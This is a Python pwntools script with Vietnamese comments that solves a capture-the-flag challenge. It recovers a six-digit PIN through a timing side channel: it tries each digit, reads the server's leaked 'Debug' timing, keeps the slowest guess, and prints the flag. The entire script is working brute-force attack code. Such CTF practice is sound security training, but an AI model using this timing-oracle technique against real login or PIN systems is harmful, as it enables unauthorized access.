from pwn import *
import re

HOST = 'ctf.csd.lol'
PORT = 5040
context.log_level = 'error'

def solve():
    print(f"[*] Đang kết nối đến {HOST}:{PORT}...")
    r = remote(HOST, PORT)
    r.recvuntil(b'PIN:')

    known_pin = ""
    print("[*] Đang dò PIN... (Lưu ý: PIN đổi mỗi lần kết nối)")

    for position in range(6):
        max_time = -1.0
        best_digit = None
        
        for digit in "0123456789":
            padding = "0" * (5 - len(known_pin))
            current_guess = known_pin + digit + padding
            
            r.sendline(current_guess.encode())
            
            try:
                # Cố gắng đọc cho đến khi server hỏi PIN tiếp
                response = r.recvuntil(b'PIN:', drop=False).decode(errors='ignore')
            except EOFError:
                print(f"\n[!!!] Server đóng kết nối tại mã: {current_guess}")
                print("[+] Đang lấy dữ liệu còn sót lại (Flag)...")
                
                # Đọc nốt phần còn lại trong bộ đệm
                final_msg = r.recvall().decode(errors='ignore')
                print("-" * 50)
                print(final_msg)
                print("-" * 50)
                return

            # Nếu chưa có Flag thì phân tích thời gian như cũ
            if "flag" in response.lower() or "csd{" in response.lower():
                print("\n[!!!] Đã thấy Flag trong phản hồi:")
                print(response)
                return

            match = re.search(r"Debug:\s+([0-9\.]+)", response)
            if match:
                server_time = float(match.group(1))
                print(f"   Thử '{current_guess}' -> Time: {server_time}s")
                if server_time > max_time:
                    max_time = server_time
                    best_digit = digit
        
        if best_digit:
            known_pin += best_digit
            print(f"--> [OK] Vị trí {position+1}: {best_digit} (Time: {max_time}s)")
        else:
            print("[X] Không tìm thấy số phù hợp.")
            break
            
    r.close()

if __name__ == "__main__":
    solve()